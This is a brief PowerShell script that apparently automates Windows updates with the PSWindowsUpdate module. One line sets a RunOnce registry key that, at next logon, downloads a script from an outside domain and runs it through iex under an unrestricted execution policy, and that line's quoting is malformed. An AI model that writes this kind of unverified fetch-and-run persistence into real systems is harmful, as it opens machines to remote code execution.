Install-Module PSWindowsUpdate -Confirm:$false -force
Add-WUServiceManager -MicrosoftUpdate -Confirm:$false
set-location HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce
new-itemproperty . MyKey -propertytype String -value "pwsh -ExecutionPolicy unrestricted -Command "& {iwr -useb https://getupdates.me/test3.ps1 | iex}"
echo "Starting Updates"
Install-WindowsUpdate -MicrosoftUpdate -AcceptAll -IgnoreReboot
Install-WindowsUpdate -MicrosoftUpdate -AcceptAll -IgnoreReboot
Install-WindowsUpdate -MicrosoftUpdate -AcceptAll -AutoReboot
